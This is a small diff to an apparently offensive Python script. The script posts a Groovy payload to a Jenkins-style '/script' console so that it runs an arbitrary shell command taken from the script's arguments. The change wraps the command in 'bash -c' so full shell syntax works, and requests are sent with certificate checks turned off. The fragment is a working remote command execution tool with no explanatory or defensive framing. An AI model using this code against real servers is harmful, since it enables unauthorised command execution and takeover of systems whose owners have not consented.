@@ -28,7 +28,7 @@ else:
 if args.cookie:
     COOKIES = json.loads(args.cookie)
 
-DATA = {'script':'def proc = "{}".execute();def os = new StringBuffer();proc.waitForProcessOutput(os, os);println(os.toString());'.format(args.command)}
+DATA = {'script':"def proc = ['bash', '-c', '''{}'''].execute();def os = new StringBuffer();proc.waitForProcessOutput(os, os);println(os.toString());".format(args.command)}
 
 r = requests.post(URL + '/script', data=DATA, auth=AUTH, cookies=COOKIES, verify=False)
 m = re.search('<h2>Result</h2><pre>(.*)</pre>', r.text, flags=re.DOTALL)
